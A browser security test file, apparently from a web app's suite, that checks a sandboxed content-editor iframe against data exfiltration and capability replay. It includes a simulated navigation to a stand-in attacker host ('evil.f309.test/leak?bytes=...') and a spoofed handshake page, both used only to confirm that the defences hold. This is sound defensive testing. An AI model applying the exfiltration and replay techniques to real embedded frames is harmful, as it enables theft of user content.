import assert from 'node:assert/strict';
import path from 'node:path';
import { after, before, test } from 'node:test';
import { fileURLToPath } from 'node:url';
import { build } from 'vite';
import { chromium } from '../../../ppt-forge/node_modules/playwright/index.mjs';

const WEB_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../..');
const HOST_ORIGIN = 'https://cafe.f309.test';
const RENDERER_ORIGIN = 'https://renderer.f309.test';
const EXFIL_ORIGIN = 'https://evil.f309.test';

let browser;
let hostBundle;

before(async () => {
  const result = await build({
    root: WEB_ROOT,
    configFile: false,
    logLevel: 'silent',
    esbuild: { jsx: 'automatic' },
    resolve: { alias: { '@': path.join(WEB_ROOT, 'src') } },
    define: { 'process.env.NEXT_PUBLIC_API_URL': JSON.stringify('https://api.f309.test') },
    build: {
      write: false,
      minify: false,
      rollupOptions: {
        input: path.join(WEB_ROOT, 'test/browser/fixtures/f309-content-editor-owner.tsx'),
        output: { format: 'es', inlineDynamicImports: true },
      },
    },
  });
  const outputs = Array.isArray(result) ? result.flatMap((item) => item.output) : result.output;
  const entry = outputs.find((item) => item.type === 'chunk' && item.isEntry);
  assert(entry && entry.type === 'chunk', 'Vite did not emit the F309 browser fixture entry');
  hostBundle = entry.code;
  browser = await chromium.launch({ headless: true });
});

after(async () => {
  await browser?.close();
});

test('content-loaded renderer cannot navigate bytes out or receive a replayed capability', async () => {
  const page = await browser.newPage();
  const browserErrors = [];
  let evilLoaded = false;
  let evilConnectCount = 0;
  let exfilRequestCount = 0;
  page.on('pageerror', (error) => browserErrors.push(error.stack ?? error.message));
  page.on('console', (message) => {
    if (message.text() === 'f309-evil-loaded') evilLoaded = true;
    if (message.text() === 'f309-evil-connect') evilConnectCount += 1;
  });
  await page.route(`${HOST_ORIGIN}/**`, async (route) => {
    const pathname = new URL(route.request().url()).pathname;
    if (pathname === '/host.js') {
      await route.fulfill({ status: 200, contentType: 'text/javascript', body: hostBundle });
      return;
    }
    await route.fulfill({
      status: 200,
      contentType: 'text/html',
      body: '<!doctype html><div id="root"></div><script type="module" src="/host.js"></script>',
    });
  });
  await page.route(`${RENDERER_ORIGIN}/**`, async (route) => {
    const pathname = new URL(route.request().url()).pathname;
    await route.fulfill({
      status: 200,
      contentType: 'text/html',
      headers: {
        'content-security-policy': `default-src 'none'; script-src 'unsafe-inline'; connect-src 'none'; frame-ancestors ${HOST_ORIGIN}`,
      },
      body: pathname === '/escape.html' ? replayDocument() : rendererDocument(),
    });
  });
  await page.route(`${EXFIL_ORIGIN}/**`, async (route) => {
    exfilRequestCount += 1;
    await route.abort();
  });

  await page.goto(`${HOST_ORIGIN}/`, { waitUntil: 'domcontentloaded' });
  const iframe = page.locator('iframe');
  await iframe.waitFor({ state: 'attached', timeout: 10_000 }).catch(async (error) => {
    throw new Error(`${error.message}\nBrowser errors:\n${browserErrors.join('\n')}\nHTML:\n${await page.content()}`);
  });
  assert.equal(await iframe.getAttribute('sandbox'), 'allow-scripts allow-same-origin');
  assert.equal(new URL(await iframe.getAttribute('src')).origin, RENDERER_ORIGIN);
  await page.locator('[data-testid="content-editor-connected"]').waitFor();

  const renderer = page.frames().find((frame) => frame.url().startsWith(RENDERER_ORIGIN));
  assert(renderer, 'dedicated renderer frame did not load');
  assert.deepEqual(await renderer.evaluate(() => window.__f309RendererState), {
    connectCount: 1,
    contentLoaded: true,
    storageAvailable: true,
  });

  await renderer.evaluate((target) => location.assign(target), `${EXFIL_ORIGIN}/leak?bytes=UEsDBA`);
  await page.waitForTimeout(50);
  assert.equal(exfilRequestCount, 0, 'content-loaded renderer issued an external navigation request');

  const bootstrap = new URL(renderer.url()).hash;
  await iframe.evaluate((frame, nextUrl) => {
    frame.src = nextUrl;
  }, `${RENDERER_ORIGIN}/escape.html${bootstrap}`);
  await page.locator('[data-testid="content-editor-unavailable"]').waitFor();
  await page.waitForTimeout(50);
  assert.equal(evilLoaded, true, 'same-origin navigation target document did not execute');
  assert.equal(evilConnectCount, 0, 'same-origin navigated document received a replayed capability');
  assert.deepEqual(await page.evaluate(() => window.__f309Requests.map(({ method }) => method)), [
    'POST',
    'POST',
    'DELETE',
  ]);
  await page.close();
});

function rendererDocument() {
  return `<!doctype html><script>
    const params = new URLSearchParams(location.hash.slice(1));
    const parentOrigin = params.get('cat-cafe-parent-origin');
    const handshakeNonce = params.get('cat-cafe-handshake');
    if (!window.navigation) throw new Error('Navigation API unavailable');
    navigation.addEventListener('navigate', (event) => event.preventDefault());
    let storageAvailable = true;
    try { localStorage.setItem('f309-browser-proof', 'dedicated-origin'); }
    catch { storageAvailable = false; }
    window.__f309RendererState = { connectCount: 0, contentLoaded: false, storageAvailable };
    addEventListener('message', (event) => {
      if (event.source !== parent || event.origin !== parentOrigin || event.ports.length !== 1) return;
      if (event.data?.kind !== 'cat-cafe-content-editor-connect') return;
      if (event.data?.handshakeNonce !== handshakeNonce) return;
      window.__f309RendererState.connectCount += 1;
      const port = event.ports[0];
      port.addEventListener('message', (message) => {
        if (message.data?.kind !== 'cat-cafe-content-editor-response' || !message.data?.ok) return;
        if (!(message.data.value?.bytes instanceof ArrayBuffer)) return;
        window.__f309RendererState.contentLoaded = true;
      });
      port.start();
      port.postMessage({
        v: 1,
        kind: 'cat-cafe-content-editor-request',
        sessionToken: event.data.sessionToken,
        requestId: 'browser-load-1',
        operation: 'content.load',
        payload: {},
      });
    });
    parent.postMessage({
      v: 1,
      kind: 'cat-cafe-content-editor-ready',
      bridgeVersion: '1.0.0',
      handshakeNonce,
    }, parentOrigin);
  </script>`;
}

function replayDocument() {
  return `<!doctype html><script>
    const params = new URLSearchParams(location.hash.slice(1));
    const parentOrigin = params.get('cat-cafe-parent-origin');
    const handshakeNonce = params.get('cat-cafe-handshake');
    console.log('f309-evil-loaded');
    addEventListener('message', (event) => {
      if (event.data?.kind === 'cat-cafe-content-editor-connect') console.log('f309-evil-connect');
    });
    addEventListener('load', () => setTimeout(() => parent.postMessage({
        v: 1,
        kind: 'cat-cafe-content-editor-ready',
        bridgeVersion: '1.0.0',
        handshakeNonce,
      }, parentOrigin), 0));
  </script>`;
}
